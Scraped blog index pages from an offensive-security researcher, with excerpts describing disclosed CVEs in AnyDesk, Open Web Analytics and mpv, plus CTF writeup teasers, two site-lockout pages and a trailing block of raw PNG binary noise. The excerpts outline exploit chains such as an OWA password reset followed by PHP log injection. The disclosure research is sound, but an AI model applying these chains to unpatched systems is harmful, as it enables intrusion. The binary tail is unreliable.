=== Content from devel0pment.de_488506d4_20250119_142600.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: fuzzing

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from packetstormsecurity.com_95ad3edd_20250119_125902.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from devel0pment.de_d26c8aba_20250119_142559.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Category: article

Posted on [18. March 202221. March 2022](https://devel0pment.de/?p=2494)
## [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)

[Open Web Analytics (OWA)](https://www.openwebanalytics.com/) is an open-source alternative to Google Analytics. OWA is written in PHP and can be hosted on an own server. Version 1.7.3 suffers from two vulnerabilities, which can be exploited by an unauthenticated attacker to gain RCE, when chained together.

The cause of the first vulnerability ([CVE-2022-24637](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24637)) is a single quote / double quote confusion, which leads to an information disclosure. The header of an automatically generated PHP cache file containing sensitive information is defined as '<?php\n…' instead of "<?php\n…". This leads to a literal backslash and n character being written instead of a newline character resulting in a broken PHP tag. Because of this the file is not interpreted as PHP code, but delivered in plain leaking sensitive cache information. This information can be leveraged to set a new password for the admin user.

The second vulnerability is a PHP file write, which requires admin privileges. The internal settings for the logfile path as well as the log level can be changed by manually crafting a POST request. This way the logfile can be set to a PHP file. By also increasing the log level and generating an event with attacker controlled data, PHP code can be injected into this logfile. This results in the possibility to execute arbitrary PHP code.

I would like to thank Peter Adams, the creator and maintainer of OWA who released a patch for the issue only one day after my initial notification. I was really amazed by the quick and professional reaction. There are security issues in each and every software, but the difference is how these are dealt with.

– [Introduction](https://devel0pment.de/?p=2494#intro)

– [Single / Double Quote Confusion](https://devel0pment.de/?p=2494#vuln1)

– [PHP file write](https://devel0pment.de/?p=2494#vuln2)

– [Demonstration](https://devel0pment.de/?p=2494#demo)

– [Patch and Mitigations](https://devel0pment.de/?p=2494#patch)

– [Conclusion](https://devel0pment.de/?p=2494#con)
[Continue reading “From Single / Double Quote Confusion To RCE (CVE-2022-24637)”](https://devel0pment.de/?p=2494#more-2494)

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Posted on [14. August 201814. August 2018](https://devel0pment.de/?p=688)
## [Heap Exploitation: Off-By-One / Poison Null Byte](https://devel0pment.de/?p=688)

![](https://devel0pment.de/wp-content/uploads/2018/08/poison_null.png)

The goal of this article is to explain in detail how an off-by-one vulnerability on the heap also known as *poison null byte* can be exploited. Although this technique does not work with the latest libc, I think it can be used very good in order to demonstrate how exploits based on heap-metadata corruption work (also check out [shellphish’s how2heap](https://github.com/shellphish/how2heap)).

In order to do this I created a vulnerable program, which we will use as an example to create such an exploit. If you like to, you can start by analyzing and exploiting the program on your own (at least check out [Environment](https://devel0pment.de/?p=688#env)):

–> [heap.zip](https://devel0pment.de/wp-content/uploads/2018/08/heap.zip)

Though it is not required to the exploit the program, the source-code might be helpful:

–> [heap.c](https://devel0pment.de/wp-content/uploads/2018/08/heap.c)

The article is divided into the following sections:

–> [Environment](https://devel0pment.de/?p=688#env)

–> [Vulnerable Program](https://devel0pment.de/?p=688#vuln)

–> [Heap Basics](https://devel0pment.de/?p=688#basic)

–> [Libc-Leak](https://devel0pment.de/?p=688#libc)

–> [Control Instruction Pointer](https://devel0pment.de/?p=688#rip)

–> [One Gadget](https://devel0pment.de/?p=688#oneg)

–> [Final Exploit](https://devel0pment.de/?p=688#final)

[Continue reading “Heap Exploitation: Off-By-One / Poison Null Byte”](https://devel0pment.de/?p=688#more-688)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from packetstormsecurity.com_602e4dfd_20250119_125903.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from devel0pment.de_f9e45f82_20250119_142602.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Tag: exploitation

Posted on [13. May 202113. May 2021](https://devel0pment.de/?p=2282)
## [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)

![](https://devel0pment.de/wp-content/uploads/2021/04/he21_title.png)

HackyEaster was awesome again. From a technical point of view there weren’t too much new things, but the creativity of the provided challenges made it really fun. Including the little teaser challenge there were a total amount of 37 challenges. These challenges were divided into different levels. You could only proceed to the next level, if you have earned enough points in the current level. I really liked that new idea.

[Continue reading “Hacky Easter 2021 writeup”](https://devel0pment.de/?p=2282#more-2282)

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [1. January 202124. January 2021](https://devel0pment.de/?p=2084)
## [HACKvent20 writeup](https://devel0pment.de/?p=2084)

|  | This year’s [HACKvent](https://hacking-lab.com) hosted on [competition.hacking-lab.com](https://competition.hacking-lab.com) has been as great as every year.There was a total amount of 28 awesome challenges with varying difficulties. |
| --- | --- |

| |  | [HV20.(-1) Twelve steps of christmas](?p=2084#_1) | | --- | --- | |  | [HV20.01 Happy HACKvent 2020](?p=2084#01) | |  | [HV20.02 Chinese Animals](?p=2084#02) | |  | [HV20.03 Packed gifts](?p=2084#03) | |  | [HV20.04 Br❤celet](?p=2084#04) | |  | [HV20.05 Image DNA](?p=2084#05) | | |  | [HV20.13 Twelve steps of christmas](?p=2084#13) | | --- | --- | |  | [HV20.14 Santa’s Special GIFt](?p=2084#14) | |  | [HV20.15 Man Commands, Server Lost](?p=2084#15) | |  | [HV20.16 Naughty Rudolph](?p=2084#16) | |  | [HV20.17 Santa’s Gift Factory Control](?p=2084#17) | |  | [HV20.18 Santa’s lost home](?p=2084#18) | |  | [HV20.19 Docker Linter Service](?p=2084#19) | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| |  | [HV20.06 Twelve steps of christmas](?p=2084#06) | | --- | --- | |  | [HV20.07 Bad morals](?p=2084#07) | |  | [HV20.08 The game](?p=2084#08) | |  | [HV20.09 Santa’s Gingerbread Factory](?p=2084#09) | |  | [HV20.10 Be patient with the adjacent](?p=2084#10) | |  | [HV20.11 Chris’mas carol](?p=2084#11) | |  | [HV20.12 Wiener waltz](?p=2084#12) | | |  | [HV20.20 Twelve steps of Christmas](?p=2084#20) | | --- | --- | |  | [HV20.21 Threatened Cat](?p=2084#21) | |  | [HV20.22 Padawanlock](?p=2084#22) | |  | [HV20.23 Those who make backups are cowards!](?p=2084#23) | |  | [HV20.24 Santa’s Secure Data Storage](?p=2084#24) | |  | [HV20.H1 It’s a secret!](?p=2084#h1) | |  | [HV20.H2 Oh, another secret!](?p=2084#h2) | |  | [HV20.H3 Hidden in Plain Sight](?p=2084#h3) | |

[Continue reading “HACKvent20 writeup”](https://devel0pment.de/?p=2084#more-2084)

Posted on [6. September 20206. September 2020](https://devel0pment.de/?p=2027)
## [ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

![](https://devel0pment.de/wp-content/uploads/2020/09/alles_logo.png)

The [ALLES! CTF](https://play.allesctf.net/) ([ctftime.org](https://ctftime.org/event/1091)) took place from 04/09/2020, 16:00 UTC to 06/09/2020, 19:00 UTC with a variety of interesting, creative challenges.

Within this article I want to share my writeup on the two challenges `Actual ASLR 1` and `2`, which were authored by [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w). What I especially liked about the challenge(s) is that you could make progression step by step even getting a first flag on the way to a full shell, which grants access to the second flag.

The article is divided into the following sections:

→[Actual ASLR 1](#aaslr1)
    – [Binary](#binary)
    – [Random Algorithm](#ranalg)
    – [Reimplementation In Python](#reimpl)
    – [First Flag](#firstflag)

→[Actual ASLR 2](#aaslr2)
    – [Custom Heap](#heap)
    – [Vulnerability](#vuln)
    – [Heap Leak](#heapleak)
    – [Image Base Leak](#imgleak)
    – [Overwriting Function Pointer](#overwrite)
    – [Final Exploit](#final)

---

[Continue reading “ALLES! CTF 2020 – Actual ASLR 1/2”](https://devel0pment.de/?p=2027#more-2027)

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Posted on [23. May 202024. May 2020](https://devel0pment.de/?p=1593)
## [Hack The Box – Rope](https://devel0pment.de/?p=1593)

![](https://devel0pment.de/wp-content/uploads/2019/01/htb.png)

This article contains my writeup on the machine `Rope` from [Hack The Box](https://www.hackthebox.eu/). I really enjoyed the box, since it provides a total of three custom binaries, which are supposed to be exploited 🙂

![](https://devel0pment.de/wp-content/uploads/2019/10/htb_rope.png)

The article is divided into the following parts:

→ [User](https://devel0pment.de/?p=1593#user)
    – [Initial Recon](https://devel0pment.de/?p=1593#recon)
    – [httpserver](https://devel0pment.de/?p=1593#httpserver)
    – [Leak Memory Address](https://devel0pment.de/?p=1593#leak)
    – [Exploit Format String Vulnerability](https://devel0pment.de/?p=1593#fmt)
    – [Escalating from john to r4j (readlogs)](https://devel0pment.de/?p=1593#user_escalate)

→ [Root](https://devel0pment.de/?p=1593#root)
    – [Local Recon](https://devel0pment.de/?p=1593#recon2)
    – [contact](https://devel0pment.de/?p=1593#contact)
    – [Bruteforce](https://devel0pment.de/?p=1593#bruteforce)
    – [Libc Leak](https://devel0pment.de/?p=1593#libcleak)
    – [Final Exploit](https://devel0pment.de/?p=1593#finalexploit)

[Continue reading “Hack The Box – Rope”](https://devel0pment.de/?p=1593#more-1593)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_3697b04e_20250119_142603.html ===
�PNG

   
IHDR  �   �   ��
O  �iCCPICC profile  (�}�=H�@�\_[�EZD,"␡:Yq�\*�Bi+��`r�4iHR\ׂ��Ug]\A����I�EJ�\_Rh��q?��{ܽ��
S�� @QM=� �ܪ�E�G�"3�Dz1��u\_�<��ܟ#$�
x�9��&��̦�q�'��(���tA�G�K�q.���a=��'��:��t�x�8"+\*�{�˜�8+�kݓ�0�WW�\�9�8��@$�PF&����H�~��?l����U#��P �~�?�ݭQ��t��1��Ų>F�.Ь[���e5O �3p����0�Iz��E���m�⺭I{��0����hK>��Bx?�o��@��[k�@��Z���"e���;��ۿgZ�� /(r��H��   bKGD � � �����    pHYs  .#  .#x�?v   tIME���)   tEXtComment Created with GIMPW�    IDATx^�}|���}�S�Y��"����cL1�BB
ɗFB R�)�WBO�P�1�Ƹ�޻l˶��{/O�ΙݑVOOғm�t��z��S��Μ�sgֶdɒ6q���
��&mmm��}�n,�v�������%<���#�O�e�Y�g}�u�3���.u�)��gVy477������t��J@@�DFFIye����ɰ!����å$''G�\*UUURRR"QQQ��aa�xzz"�H��r\�j�$&&�����n���2��B���p$��b[\_�h�x�}<��VY\*-{\_���9�dG�Kk�&��+\<����$��mlj�
ޔ�Ws:��Cx����e�=Sdz����� t;ba8V��d����ҟ��~�J� �Ly�Wy���+e��"W�2uw���a��u��<'�����3�����n/FA�ݝqW����Q�g�?����G�h�2�|���kO���g��O]����G�O����'�������
$::Zmii9#���ڪ∏�?�xz\*��� |�%`���
